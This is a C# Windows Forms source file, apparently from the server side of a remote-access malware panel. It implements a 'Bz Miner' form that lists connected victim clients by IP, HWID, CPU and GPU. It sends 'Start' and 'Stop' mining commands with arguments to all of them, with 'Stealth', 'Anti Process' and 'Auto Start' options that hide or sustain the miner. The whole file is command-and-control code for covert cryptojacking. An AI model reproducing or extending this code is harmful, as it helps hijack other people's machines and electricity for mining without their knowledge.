using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Helper;

namespace Server.Forms;

public class FormMinerEtc : FormMaterial
{
	public bool work;

	private IContainer components;

	private Panel panel1;

	public MaterialSwitch materialSwitch2;

	private RJButton rjButton1;

	public MaterialSwitch materialSwitch1;

	public MaterialSwitch materialSwitch7;

	public DataGridView GridClients;

	private DataGridViewTextBoxColumn ColumnIP;

	private DataGridViewTextBoxColumn ColumnHwid;

	private DataGridViewTextBoxColumn ColumnStatus;

	private DataGridViewTextBoxColumn ColumnCpu;

	private DataGridViewTextBoxColumn ColumnGpu;

	private Timer timer1;

	public RJTextBox rjTextBox2;

	public MaterialSwitch materialSwitch3;

	public RJTextBox rjTextBox3;

	public FormMinerEtc()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormProcess_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		if (File.Exists("local\\MinerEtc.json"))
		{
			MinerXMR minerXMR = JsonConvert.DeserializeObject<MinerXMR>(File.ReadAllText("local\\MinerEtc.json"));
			materialSwitch1.Checked = minerXMR.AntiProcess;
			materialSwitch3.Checked = minerXMR.Stealth;
			rjTextBox3.Texts = minerXMR.ArgsStealh;
			rjTextBox2.Texts = minerXMR.Args;
			if (minerXMR.AutoStart)
			{
				materialSwitch2.Checked = true;
				work = true;
				materialSwitch7.Checked = true;
			}
		}
	}

	private void ChangeScheme(object sender)
	{
		Color primary = FormMaterial.PrimaryColor;
		bool isDark = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color back = (isDark ? Color.FromArgb(40, 40, 40) : SystemColors.Control);
		Color text = (isDark ? Color.WhiteSmoke : SystemColors.ControlText);
		rjTextBox2.BorderColor = primary;
		rjTextBox3.BorderColor = primary;
		rjTextBox2.BackColor = back;
		rjTextBox3.BackColor = back;
		rjTextBox2.ForeColor = text;
		rjTextBox3.ForeColor = text;
		rjButton1.BackColor = primary;
		rjButton1.BackgroundColor = primary;
		rjButton1.ForeColor = Color.White;
		rjButton1.TextColor = Color.White;
		rjButton1.BorderColor = primary;
		GridClients.BackgroundColor = back;
		GridClients.ColumnHeadersDefaultCellStyle.BackColor = back;
		GridClients.ColumnHeadersDefaultCellStyle.SelectionBackColor = back;
		GridClients.ColumnHeadersDefaultCellStyle.SelectionForeColor = primary;
		GridClients.ColumnHeadersDefaultCellStyle.ForeColor = primary;
		GridClients.DefaultCellStyle.BackColor = (isDark ? Color.FromArgb(50, 50, 50) : Color.White);
		GridClients.DefaultCellStyle.SelectionBackColor = primary;
		GridClients.DefaultCellStyle.ForeColor = text;
	}

	public Clients[] ClientsAll()
	{
		List<Clients> list = new List<Clients>();
		foreach (DataGridViewRow dataGridViewRow in (IEnumerable)GridClients.Rows)
		{
			list.Add((Clients)dataGridViewRow.Tag);
		}
		return list.ToArray();
	}

	private void Closing1(object sender, FormClosingEventArgs e)
	{
		work = false;
		Clients[] array = ClientsAll();
		foreach (Clients client in array)
		{
			Task.Run(delegate
			{
				client.Disconnect();
			});
		}
		GridClients.Rows.Clear();
		Hide();
		Save();
		e.Cancel = true;
	}

	private void Save()
	{
		File.WriteAllText("local\\MinerEtc.json", JsonConvert.SerializeObject(new MinerEtc
		{
			AntiProcess = materialSwitch1.Checked,
			Stealth = materialSwitch3.Checked,
			ArgsStealh = rjTextBox3.Texts,
			AutoStart = materialSwitch2.Checked,
			Args = rjTextBox2.Texts
		}, Formatting.Indented));
	}

	public object[] Args()
	{
		if (!materialSwitch3.Checked)
		{
			return new object[3] { "Start", materialSwitch1.Checked, rjTextBox2.Texts };
		}
		return new object[4] { "Start", materialSwitch1.Checked, rjTextBox2.Texts, rjTextBox3.Texts };
	}

	private void rjButton1_Click(object sender, EventArgs e)
	{
		Hide();
	}

	private void materialSwitch7_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch7.Checked)
		{
			if (string.IsNullOrEmpty(rjTextBox2.Texts))
			{
				return;
			}
			Clients[] array = ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				array[i].Send(Args());
			}
		}
		else
		{
			Clients[] array2 = ClientsAll();
			for (int j = 0; j < array2.Length; j++)
			{
				array2[j].Send(new object[1] { "Stop" });
			}
		}
		Save();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		Text = $"Bz Miner           Online [{GridClients.Rows.Count}]";
	}

	private void materialSwitch2_CheckedChanged(object sender, EventArgs e)
	{
		Save();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		this.panel1 = new System.Windows.Forms.Panel();
		this.rjTextBox3 = new CustomControls.RJControls.RJTextBox();
		this.materialSwitch3 = new MaterialSkin.Controls.MaterialSwitch();
		this.rjTextBox2 = new CustomControls.RJControls.RJTextBox();
		this.materialSwitch2 = new MaterialSkin.Controls.MaterialSwitch();
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSwitch7 = new MaterialSkin.Controls.MaterialSwitch();
		this.GridClients = new System.Windows.Forms.DataGridView();
		this.ColumnIP = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnHwid = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnStatus = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnCpu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnGpu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.GridClients).BeginInit();
		base.SuspendLayout();
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Controls.Add(this.rjTextBox3);
		this.panel1.Controls.Add(this.materialSwitch3);
		this.panel1.Controls.Add(this.rjTextBox2);
		this.panel1.Controls.Add(this.materialSwitch2);
		this.panel1.Controls.Add(this.rjButton1);
		this.panel1.Controls.Add(this.materialSwitch1);
		this.panel1.Controls.Add(this.materialSwitch7);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(971, 128);
		this.panel1.TabIndex = 12;
		this.rjTextBox3.BackColor = System.Drawing.Color.White;
		this.rjTextBox3.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjTextBox3.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox3.BorderRadius = 0;
		this.rjTextBox3.BorderSize = 1;
		this.rjTextBox3.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox3.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.rjTextBox3.Location = new System.Drawing.Point(15, 86);
		this.rjTextBox3.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox3.Multiline = false;
		this.rjTextBox3.Name = "rjTextBox3";
		this.rjTextBox3.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox3.PasswordChar = false;
		this.rjTextBox3.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox3.PlaceholderText = "Args Stealh";
		this.rjTextBox3.Size = new System.Drawing.Size(788, 30);
		this.rjTextBox3.TabIndex = 11;
		this.rjTextBox3.Texts = "";
		this.rjTextBox3.UnderlinedStyle = false;
		this.materialSwitch3.AutoSize = true;
		this.materialSwitch3.Depth = 0;
		this.materialSwitch3.Location = new System.Drawing.Point(394, 9);
		this.materialSwitch3.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch3.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch3.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch3.Name = "materialSwitch3";
		this.materialSwitch3.Ripple = true;
		this.materialSwitch3.Size = new System.Drawing.Size(108, 37);
		this.materialSwitch3.TabIndex = 10;
		this.materialSwitch3.Text = "Stealth";
		this.materialSwitch3.UseVisualStyleBackColor = true;
		this.rjTextBox2.BackColor = System.Drawing.Color.White;
		this.rjTextBox2.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjTextBox2.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox2.BorderRadius = 0;
		this.rjTextBox2.BorderSize = 1;
		this.rjTextBox2.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox2.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.rjTextBox2.Location = new System.Drawing.Point(15, 50);
		this.rjTextBox2.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox2.Multiline = false;
		this.rjTextBox2.Name = "rjTextBox2";
		this.rjTextBox2.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox2.PasswordChar = false;
		this.rjTextBox2.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox2.PlaceholderText = "Args add";
		this.rjTextBox2.Size = new System.Drawing.Size(788, 30);
		this.rjTextBox2.TabIndex = 9;
		this.rjTextBox2.Texts = "";
		this.rjTextBox2.UnderlinedStyle = false;
		this.materialSwitch2.AutoSize = true;
		this.materialSwitch2.Depth = 0;
		this.materialSwitch2.Location = new System.Drawing.Point(517, 9);
		this.materialSwitch2.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch2.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch2.Name = "materialSwitch2";
		this.materialSwitch2.Ripple = true;
		this.materialSwitch2.Size = new System.Drawing.Size(129, 37);
		this.materialSwitch2.TabIndex = 8;
		this.materialSwitch2.Text = "Auto Start";
		this.materialSwitch2.UseVisualStyleBackColor = true;
		this.materialSwitch2.CheckedChanged += new System.EventHandler(materialSwitch2_CheckedChanged);
		this.rjButton1.BackColor = System.Drawing.Color.White;
		this.rjButton1.BackgroundColor = System.Drawing.Color.White;
		this.rjButton1.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.BorderRadius = 0;
		this.rjButton1.BorderSize = 1;
		this.rjButton1.FlatAppearance.BorderSize = 0;
		this.rjButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton1.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.Location = new System.Drawing.Point(15, 12);
		this.rjButton1.Name = "rjButton1";
		this.rjButton1.Size = new System.Drawing.Size(92, 28);
		this.rjButton1.TabIndex = 7;
		this.rjButton1.Text = "Hide";
		this.rjButton1.TextColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.UseVisualStyleBackColor = false;
		this.rjButton1.Click += new System.EventHandler(rjButton1_Click);
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Location = new System.Drawing.Point(236, 9);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(146, 37);
		this.materialSwitch1.TabIndex = 6;
		this.materialSwitch1.Text = "Anti Process";
		this.materialSwitch1.UseVisualStyleBackColor = true;
		this.materialSwitch7.AutoSize = true;
		this.materialSwitch7.Depth = 0;
		this.materialSwitch7.Location = new System.Drawing.Point(132, 9);
		this.materialSwitch7.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch7.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch7.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch7.Name = "materialSwitch7";
		this.materialSwitch7.Ripple = true;
		this.materialSwitch7.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch7.TabIndex = 4;
		this.materialSwitch7.Text = "Start";
		this.materialSwitch7.UseVisualStyleBackColor = true;
		this.materialSwitch7.CheckedChanged += new System.EventHandler(materialSwitch7_CheckedChanged);
		this.GridClients.AllowUserToAddRows = false;
		this.GridClients.AllowUserToDeleteRows = false;
		this.GridClients.AllowUserToResizeColumns = false;
		this.GridClients.AllowUserToResizeRows = false;
		this.GridClients.BackgroundColor = System.Drawing.Color.White;
		this.GridClients.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.GridClients.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.GridClients.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle1.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle1.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle1.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle1.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle1.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle1.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridClients.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle1;
		this.GridClients.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.GridClients.Columns.AddRange(this.ColumnIP, this.ColumnHwid, this.ColumnStatus, this.ColumnCpu, this.ColumnGpu);
		this.GridClients.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.GridClients.DefaultCellStyle = dataGridViewCellStyle2;
		this.GridClients.Dock = System.Windows.Forms.DockStyle.Fill;
		this.GridClients.EnableHeadersVisualStyles = false;
		this.GridClients.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.GridClients.Location = new System.Drawing.Point(3, 192);
		this.GridClients.Name = "GridClients";
		this.GridClients.ReadOnly = true;
		this.GridClients.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridClients.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.GridClients.RowHeadersVisible = false;
		this.GridClients.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.GridClients.ShowCellErrors = false;
		this.GridClients.ShowCellToolTips = false;
		this.GridClients.ShowEditingIcon = false;
		this.GridClients.ShowRowErrors = false;
		this.GridClients.Size = new System.Drawing.Size(971, 340);
		this.GridClients.TabIndex = 11;
		this.ColumnIP.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.ColumnIP.HeaderText = "IP";
		this.ColumnIP.MinimumWidth = 120;
		this.ColumnIP.Name = "ColumnIP";
		this.ColumnIP.ReadOnly = true;
		this.ColumnIP.Width = 120;
		this.ColumnHwid.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.ColumnHwid.HeaderText = "Hwid";
		this.ColumnHwid.MinimumWidth = 200;
		this.ColumnHwid.Name = "ColumnHwid";
		this.ColumnHwid.ReadOnly = true;
		this.ColumnHwid.Width = 200;
		this.ColumnStatus.HeaderText = "Status";
		this.ColumnStatus.MinimumWidth = 100;
		this.ColumnStatus.Name = "ColumnStatus";
		this.ColumnStatus.ReadOnly = true;
		this.ColumnCpu.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnCpu.HeaderText = "Cpu";
		this.ColumnCpu.MinimumWidth = 100;
		this.ColumnCpu.Name = "ColumnCpu";
		this.ColumnCpu.ReadOnly = true;
		this.ColumnGpu.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.ColumnGpu.HeaderText = "Gpu";
		this.ColumnGpu.Name = "ColumnGpu";
		this.ColumnGpu.ReadOnly = true;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(977, 535);
		base.Controls.Add(this.GridClients);
		base.Controls.Add(this.panel1);
		base.Name = "FormMinerEtc";
		this.Text = "Bz Miner           Online [0]";
		base.Load += new System.EventHandler(FormProcess_Load);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.GridClients).EndInit();
		base.ResumeLayout(false);
	}
}
